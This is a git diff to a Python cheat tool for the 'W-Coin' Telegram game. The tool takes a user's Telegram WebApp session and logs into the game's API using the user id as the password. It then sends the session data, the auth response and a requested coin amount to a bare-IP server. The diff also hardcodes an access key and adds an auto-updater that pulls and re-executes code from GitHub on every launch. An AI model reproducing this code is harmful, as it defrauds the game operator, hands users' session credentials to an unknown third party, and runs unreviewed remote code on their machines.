@@ -3,9 +3,10 @@ import pyfiglet
 from colorama import Fore, Style, init
 import json
 import requests
-import time 
+import time
 from urllib.parse import urlparse, parse_qs
 from user_agent import generate_user_agent
+import subprocess
 
 user_agent = generate_user_agent('android')
 headers = {
@@ -28,7 +29,37 @@ headers = {
 
 init(autoreset=True)
 
-def main_wcoin(session ,amount, key):
+# Function to check for updates from the GitHub repository
+def check_for_updates():
+    print(Fore.YELLOW + "Checking for updates...")
+    repo_url = 'BLACK-NINJA-PK/W-Coin'  # Your GitHub repository
+    # Get the latest commit hash from the GitHub repository
+    api_url = f'https://api.github.com/repos/{repo_url}/commits/main'
+    response = requests.get(api_url)
+    latest_commit = response.json().get('sha')
+    
+    # Get the current commit hash
+    current_commit = subprocess.check_output(["git", "rev-parse", "HEAD"]).strip().decode()
+
+    if latest_commit != current_commit:
+        print(Fore.RED + "New update available. Updating...")
+        update_script()
+    else:
+        print(Fore.GREEN + "Your script is up to date.")
+
+# Function to pull the latest changes from the repository
+def update_script():
+    try:
+        subprocess.run(["git", "pull"], check=True)
+        print(Fore.GREEN + "Script updated successfully!")
+        time.sleep(2)
+        os.execv(__file__, ['python'] + sys.argv)  # Restart the script
+    except subprocess.CalledProcessError as e:
+        print(Fore.RED + f"Failed to update the script: {e}")
+
+# Existing functions for Wcoin and other features
+def main_wcoin(session, amount):
+    key = "GWWT"  # Automatically inserting the key here
     parsed_url = urlparse(session)
     query_params = parse_qs(parsed_url.fragment)
     tgWebAppData = query_params.get('tgWebAppData', [None])[0]
@@ -36,14 +67,15 @@ def main_wcoin(session ,amount, key):
     user_data = json.loads(user_data)
     identifier = str(user_data['id'])
     json_data = {
-            'identifier':identifier,
+            'identifier': identifier,
             'password': identifier,
         }
     res = requests.post('https://starfish-app-fknmx.ondigitalocean.app/wapi/api/auth/local', json=json_data).json()
     r = requests.post('http://213.218.240.167:5000/private',json={'initData':session,'serverData':res,'amount':amount,'key':key})
     return (r.json())
+
 def create_gradient_banner(text):
-    banner = pyfiglet.figlet_format(text,font='slant').splitlines()
+    banner = pyfiglet.figlet_format(text, font='slant').splitlines()
     colors = [Fore.GREEN + Style.BRIGHT, Fore.YELLOW + Style.BRIGHT, Fore.RED + Style.BRIGHT]
     total_lines = len(banner)
     section_size = total_lines // len(colors)
@@ -68,27 +100,27 @@ def print_info_box(social_media_usernames):
     print(Fore.WHITE + Style.BRIGHT + '+' + '-' * (box_width - 2) + '+')
 
 if __name__ == "__main__":
+    # Check for updates from your GitHub repository
+    check_for_updates()
+
     banner_text = "NINJA"
     os.system('cls' if os.name == 'nt' else 'clear')
     create_gradient_banner(banner_text)
     social_media_usernames = [
         ("TELEGRAM", "@black_ninja_pk"),
         ("TELEGRAM", "@black_ninja_pk"),
-        ("Authorization key", "@GWWT"),
-        #("", "@"),
+        ("Authorization key", "@GWWT"),  # Displaying the key
         ("Coder", "@demoncratos"),
     ]
     
     print_info_box(social_media_usernames)
     user_input = input("\nEnter Wcoin Session ID : ")
     balance_input = input("Please Enter Coin Amount : ")
-    key = input("Please enter Authorization Key  : ")
-    data = main_wcoin(user_input,int(balance_input),key)
+    data = main_wcoin(user_input, int(balance_input))  # Removed the key parameter
     os.system('cls' if os.name == 'nt' else 'clear')
     create_gradient_banner('Done')
 
-        
-    try :
+    try:
         print(Fore.GREEN + Style.BRIGHT + "=== User Information ===")
         print(Fore.YELLOW + f"Username: {data['username']}")
         print(Fore.CYAN + f"Email: {data['email']}")
